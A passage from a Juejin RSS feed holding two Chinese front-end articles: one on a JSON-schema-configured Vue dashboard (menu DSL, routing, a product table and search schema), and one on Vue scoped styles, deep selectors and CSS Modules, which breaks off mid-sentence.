        <span class="hljs-comment">// 当 menuType == module 可填</span>
        <span class="hljs-attr">moduleType</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//模块类型,枚举值: sider / iframe / custom/ schema</span>
        
        <span class="hljs-comment">// 当 moduleType == sider 时</span>
        siderConfig={
            <span class="hljs-attr">menu</span>: [{
                <span class="hljs-comment">// 可递归menuItem(除去moduleType == sider)</span>
                <span class="hljs-comment">//也就是说在侧边栏的菜单配置不能再 进行moduleType == sider 配置这样不合理</span>
                <span class="hljs-comment">//多级菜单 menuType=group 配置子菜单</span>
            }]
        }
        
        <span class="hljs-comment">// 当 moduleType == iframe 时</span>
        <span class="hljs-attr">iframeConfig</span>: {
            <span class="hljs-attr">path</span>: <span class="hljs-string">''</span><span class="hljs-comment">//iframe 路径</span>
        },
        
        <span class="hljs-comment">// 当 moduleType == custom 时</span>
        <span class="hljs-attr">customConfig</span>: {
            <span class="hljs-attr">path</span>: <span class="hljs-string">''</span><span class="hljs-comment">//自定义路由路径</span>
        },
        
        <span class="hljs-comment">// 当 moduleType == schema 时</span>
        schemaConfig={...}
    }]
}
</code></pre>
<h5 data-id="heading-6">1. 导航栏与侧边栏</h5>
<p>在DSL中根据<code>menu</code>字段进行导航栏上的菜单的渲染,在通过<code>menuType</code>字段判断是否导航栏上当前菜单需要子菜单展示,<code>moduleType</code>表示当前菜单在页面上的展示方式。只是<code>moduleType=sider</code>时需要侧边栏菜单。</p>
<ul>
<li><strong>header-container(导航栏组件)</strong> : 根据<code>menu</code>菜单配置内容生成导航栏</li>
<li><strong>sider-container(侧边栏组件)</strong>: 根据<code>siderConfig.menu</code>配置内容生成侧边栏</li>
</ul>
<h5 data-id="heading-7">2. 页面内容展示方式</h5>
<p>我们将<strong>main-content</strong> 插槽下作为页面的核心渲染区域,主要有三种方式展示页面,以配置项<code>moduleType</code>(iframe/custom/schema)值进行展示区分,在前端以划分不同路由分别解析对应的页面组件。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">[
   <span class="hljs-comment">// moduleType === iframe 时,处理iframeConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/iframe'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/iframe-view/iframe-view.vue'</span>)
   },
   <span class="hljs-comment">// moduleType === schema 时,处理schemaConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/schema'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/schema-view/schema-view.vue'</span>)
   },
   <span class="hljs-comment">// moduleType === custom 时,处理customConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/todo'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./todo/todo.vue'</span>)
   },
   <span class="hljs-comment">// moduleType === sider 时,处理siderConfig</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/sider'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/sider-view/sider-view.vue'</span>),
       <span class="hljs-attr">children</span>: [
           {
               <span class="hljs-attr">path</span>: <span class="hljs-string">'iframe'</span>,
               <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/iframe-view/iframe-view.vue'</span>)
           },
           {
               <span class="hljs-attr">path</span>: <span class="hljs-string">'schema'</span>,
               <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/schema-view/schema-view.vue'</span>)
           },
           {
               <span class="hljs-attr">path</span>: <span class="hljs-string">'todo'</span>,
               <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./todo/todo.vue'</span>)
           },
       ]
   },
   <span class="hljs-comment">//进行sider路由兜底</span>
   {
       <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/sider/:chapters'</span>,
       <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./complex-view/sider-view/sider-view.vue'</span>),
   },
]
</code></pre>
<h6 data-id="heading-8">2.1 <strong>iframe-view</strong></h6>
<p>这种方式主要使用<code>iframe</code>控件加载第三方页面,实现不同页面的集成方案</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-attr">moduleType</span>: <span class="hljs-string">'iframe'</span>,
<span class="hljs-attr">iframeConfig</span>: {
   <span class="hljs-attr">path</span>: <span class="hljs-string">'https://www.baidu.com/'</span>,
}
</code></pre>
<h6 data-id="heading-9">2.2 <strong>custom-view</strong></h6>
<p>当然以这种方式进行加载时,没有特定组件进行加载,因为这个属于<code>用户自定义路由方式</code>进行呈现,
这样就给用户在该架构下进行定制化开发。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 因为在该架构下首屏采用SSR方式加载,后续页面采用CSR模式进行路由跳转</span>
<span class="hljs-comment">// 当 moduleType == custom 时 </span>
<span class="hljs-attr">moduleType</span>: <span class="hljs-string">'custom'</span>,
<span class="hljs-attr">customConfig</span>: { 
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/todo'</span>  <span class="hljs-comment">//自定义路由路径</span>
},

<span class="hljs-comment">//前端routes 路由定义</span>
{
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/view/dashboard/todo'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./todo/todo.vue'</span>)
},
</code></pre>
<h6 data-id="heading-10">2.3 <strong>schema-view</strong> 重点</h6>
<p><code>schema-view</code>解析架构图,以商品管理模块进行展示
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a8f94b9284e48358e9c57e164aa49a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5b-15LmL6Ze0bHE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766466449&amp;x-signature=EnJ8a3YITcrePdMSYG0P9xPV8JQ%3D" alt="ScreenShot_2025-12-16_113038_589.png" loading="lazy"/>
商品管理Schema配置如下</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">        {
            <span class="hljs-attr">key</span>: <span class="hljs-string">'product'</span>,
            <span class="hljs-attr">name</span>: <span class="hljs-string">'商品管理'</span>,
            <span class="hljs-attr">menuType</span>: <span class="hljs-string">'module'</span>,
            <span class="hljs-attr">moduleType</span>: <span class="hljs-string">'schema'</span>,
            <span class="hljs-attr">schemaConfig</span>: {
                <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/proj/product'</span>,
                <span class="hljs-attr">schema</span>: {
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
                    <span class="hljs-attr">properties</span>: {
                        <span class="hljs-attr">product_id</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'商品ID'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">300</span>,
                                <span class="hljs-string">"show-overflow-tooltip"</span>: <span class="hljs-literal">true</span>
                            },
                        },
                        <span class="hljs-attr">product_name</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'商品名称'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
                            },
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'dynamicSelect'</span>,
                                <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'请选择商品名称'</span>,
                                <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/proj/product_enum/list'</span>,
                            }
                        },
                        <span class="hljs-attr">price</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'number'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'价格'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
                            },
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'select'</span>,
                                <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'请选择价格'</span>,
                                <span class="hljs-attr">enumList</span>: [{
                                    <span class="hljs-attr">value</span>: -<span class="hljs-number">999</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'全部'</span>
                                }, {
                                    <span class="hljs-attr">value</span>: <span class="hljs-string">'39.9'</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'¥39.9'</span>
                                }, {
                                    <span class="hljs-attr">value</span>: <span class="hljs-string">'199'</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'¥199'</span>
                                }, {
                                    <span class="hljs-attr">value</span>: <span class="hljs-string">'699'</span>,
                                    <span class="hljs-attr">label</span>: <span class="hljs-string">'¥699'</span>
                                }]
                            }
                        },
                        <span class="hljs-attr">inventory</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'number'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'库存'</span>,
                            <span class="hljs-attr">tableOption</span>: {
                                <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
                            },
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'input'</span>,
                                <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'请输入商品名称'</span>
                            }
                        },
                        <span class="hljs-attr">create_time</span>: {
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
                            <span class="hljs-attr">label</span>: <span class="hljs-string">'创建时间'</span>,
                            <span class="hljs-attr">tableOption</span>: {},
                            <span class="hljs-attr">searchOption</span>: {
                                <span class="hljs-attr">comType</span>: <span class="hljs-string">'dateRange'</span>,
                            }
                        },
                    }
                },
                <span class="hljs-attr">tableConfig</span>: {
                    <span class="hljs-attr">headerButtons</span>: [{
                        <span class="hljs-attr">label</span>: <span class="hljs-string">'新增商品'</span>,
                        <span class="hljs-attr">eventKey</span>: <span class="hljs-string">'showComponent'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'primary'</span>,
                        <span class="hljs-attr">plain</span>: <span class="hljs-literal">true</span>
                    }],
                    <span class="hljs-attr">rowButtons</span>: [
                        {
                            <span class="hljs-attr">label</span>: <span class="hljs-string">"修改"</span>,
                            <span class="hljs-attr">eventKey</span>: <span class="hljs-string">'showComponent'</span>,
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'warning'</span>,
                        },
                        {
                            <span class="hljs-attr">label</span>: <span class="hljs-string">"删除"</span>,
                            <span class="hljs-attr">eventKey</span>: <span class="hljs-string">'remove'</span>,
                            <span class="hljs-attr">eventOption</span>: {
                                <span class="hljs-attr">params</span>: {
                                    <span class="hljs-attr">product_id</span>: <span class="hljs-string">"schema::product_id"</span>
                                }
                            },
                            <span class="hljs-attr">type</span>: <span class="hljs-string">'danger'</span>,
                        }],
                }
            }
        },
</code></pre>
<p>在<code>schema-view</code>中<code>search-panel</code>(搜索）与 <code>table-panel</code>（表格）组成,首先我们就要针对<code>schema</code>配置进行拆分找出我们需要的配置内容,给其下的组件进行使用</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">    <span class="hljs-comment">//通用构建 schema方法</span>
    <span class="hljs-comment">// _schema配置选项, comName=&gt;table / search</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">buildDtoSchema</span> = (<span class="hljs-params">_schema, comName</span>) =&gt; {
        <span class="hljs-keyword">if</span> (!_schema?.<span class="hljs-property">properties</span>) { <span class="hljs-keyword">return</span> {} }
        <span class="hljs-keyword">const</span> dtoSchema = {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
            <span class="hljs-attr">properties</span>: {}
        }
        <span class="hljs-comment">// 提取有效 schema 字段量</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> _schema.<span class="hljs-property">properties</span>) {
            <span class="hljs-keyword">const</span> props = _schema.<span class="hljs-property">properties</span>[key]
            <span class="hljs-keyword">if</span> (props[<span class="hljs-string">`<span class="hljs-subst">${comName}</span>Option`</span>]) {
                <span class="hljs-keyword">let</span> dtoProps = {}
                <span class="hljs-comment">//提取 props 中非 option的部分,存放到 dtoProps中</span>
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> pKey <span class="hljs-keyword">in</span> props) {
                    <span class="hljs-keyword">if</span> (pKey.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Option'</span>) &lt; <span class="hljs-number">0</span>) {
                        dtoProps[pKey] = props[pKey]
                    }
                }
                <span class="hljs-comment">//处理 comName Option</span>
                dtoProps = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, dtoProps, { <span class="hljs-attr">option</span>: props[<span class="hljs-string">`<span class="hljs-subst">${comName}</span>Option`</span>] })
                dtoSchema.<span class="hljs-property">properties</span>[key] = dtoProps
            }
        }
        <span class="hljs-keyword">return</span> dtoSchema
    }
</code></pre>
<h6 data-id="heading-11">2.3.1 <strong>table-panel</strong></h6>
<p>该组件主要完成表格Schema配置页面渲染</p>
<ol>
<li>通过<code>tableConfig.headerButtons</code>完成表格上面操作<code>新增商品</code>按钮渲染</li>
<li>通过<code>tableConfig.rowButtons</code>完成表格每列操作栏上完成<code>修改,删除</code>按钮,并针对按钮的事件<code>eventKey</code>进行相关的配置<code>eventOption</code>完成业务操作</li>
<li>使用<code>schema-table</code> 组件,完成业务接口请求,并通过<code>schema.properties</code>中每一项<code>key</code>完成表格渲染</li>
</ol>
<h6 data-id="heading-12">2.3.2 <strong>search-panel</strong></h6>
<p>该组件主要完成表单搜索栏,进行对表格数据的筛选搜索功能</p>
<ol>
<li>通过<code>schema.properties</code>中每一项的<code>searchOption.comType</code>完成对应的<code>动态表单</code>加载展示,</li>
<li>并使用<code>tableOption</code> 进行属性透传,使用UI组件已有的功能</li>
<li>以及针对不同表单类型提供自定义选项或者api请求获取选项数据</li>
</ol>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">//不同表单组件的统一导出</span>
<span class="hljs-keyword">import</span> input <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/input/input.vue"</span>;
<span class="hljs-keyword">import</span> select <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/select/select.vue"</span>;
<span class="hljs-keyword">import</span> dynamicSelect <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/dynamic-select/dynamic-select.vue"</span>;
<span class="hljs-keyword">import</span> dateRange <span class="hljs-keyword">from</span> <span class="hljs-string">"./complex-view/date-range/date-range.vue"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">SearchItemConfig</span> = {
    <span class="hljs-attr">input</span>: {
        <span class="hljs-attr">component</span>: input,
    },
    <span class="hljs-attr">select</span>: {
        <span class="hljs-attr">component</span>: select,
    },
    <span class="hljs-attr">dynamicSelect</span>: {
        <span class="hljs-attr">component</span>: dynamicSelect,
    },
    <span class="hljs-attr">dateRange</span>: {
        <span class="hljs-attr">component</span>: dateRange,
    }
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">SearchItemConfig</span>


<span class="hljs-comment">//表单组件的引用</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">SearchItemConfig</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./search-item-config.js'</span>

&lt;!-- 动态组件 --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(schemaItem, key) in schema.properties"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> <span class="hljs-attr">:label</span>=<span class="hljs-string">"schemaItem.label"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 子控件展示 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:ref</span>=<span class="hljs-string">"handleSearchComList"</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"SearchItemConfig[schemaItem.option?.comType].component"</span>
    <span class="hljs-attr">:key</span>=<span class="hljs-string">"key"</span> <span class="hljs-attr">:schemaKey</span>=<span class="hljs-string">"key"</span> <span class="hljs-attr">:schema</span>=<span class="hljs-string">"schemaItem"</span> @<span class="hljs-attr">loaded</span>=<span class="hljs-string">"handleLoaded"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span></span>

</code></pre>
<h2 data-id="heading-13">3.总结</h2>
<ol>
<li>学习了<code>JsonShema</code>配置化形成领域模型架构思路</li>
<li>学会提炼关键业务,从以前的开发代码的编写转变为业务需求的配置定义</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue---scoped,deep,CSS Modules]]></title>    <link>https://juejin.cn/post/7583955708318695424</link>    <guid>https://juejin.cn/post/7583955708318695424</guid>    <pubDate>2025-12-16T03:31:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583955708318695424" data-draft-id="7583955708318662656" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue---scoped,deep,CSS Modules"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:31:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="永远少年"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue---scoped,deep,CSS Modules
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    永远少年
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:31:33.000Z" title="Tue Dec 16 2025 03:31:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0"> scoped</h2>
<blockquote>
<p>scoped是Vue组件标签中的一个特性,作用是限制CSS 只作用于当前组件，防止影响全局或其他组件。
</p></blockquote>
<h4 data-id="heading-1">作用原理</h4>
<blockquote>
<p> Vue 通过 自动添加属性选择器（如 <code>data-v-xxxx</code>）来作用于当前组件的元素，从而实现 CSS 作用域隔离。</p>
</blockquote>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    Scoped 样式示例
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p> 编译后</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span> class="container" data-v-abc123&gt;Scoped 样式示例&lt;/<span class="hljs-selector-tag">div</span>&gt;
<span class="hljs-selector-class">.container</span><span class="hljs-selector-attr">[data-v-abc123]</span> {
  <span class="hljs-attribute">color</span>: red;
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-2">deep</h2>
<blockquote>
<p><code>/deep/</code>（或 <code>::v-deep</code>）在 Vue 中用于<strong>穿透 scoped 样式</strong>，作用是让<strong>样式作用于子组件的深层次元素</strong>，即使它们位于 <code>scoped</code> 作用域内。</p>
</blockquote>
<h4 data-id="heading-3">实际开发应用</h4>
<ul>
<li> 修改第三方库(Element UI,Ant等)组件样式</li>
<li>直接作用子组件深层次的元素</li>
</ul>
<h4 data-id="heading-4">使用方式</h4>
<h5 data-id="heading-5">vue2(/deep/或者&gt;&gt;&gt;)</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
/deep/ <span class="hljs-selector-class">.child-element</span> {
  <span class="hljs-attribute">color</span>: red;
}

<span class="hljs-comment">/* 或者使用 &gt;&gt;&gt;，它是 `/deep/` 的别名 */</span>
&gt;&gt;&gt; <span class="hljs-selector-class">.child-element</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h5 data-id="heading-6"> vue3(::v-deep() 或者:deep())</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
::<span class="hljs-built_in">v-deep</span>(.child-element) {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
:<span class="hljs-built_in">deep</span>(.child-element) {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-7">CSS Modules</h2>
<h4 data-id="heading-8">优点</h4>
<ul>
<li><strong>避免全局样式冲突</strong>：每个组件的样式都是局部的，不会影响其他组件。</li>
<li><strong>支持动态绑定</strong>：可以用 <code>:class</code> 绑定动态样式。</li>
<li><strong>适用于 Vue 组件化开发</strong>，特别是在大型项目中更容易管理。</li>
</ul>
<h4 data-id="heading-9">基本使用</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"$style.title"</span>&gt;</span>Hello CSS Modules<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">module</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.title</span> {
  <span class="hljs-attribute">color</span>: red;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-10">作用原理</h4>
<p>1.title类名会被自动转换成一个唯一的名称</p>
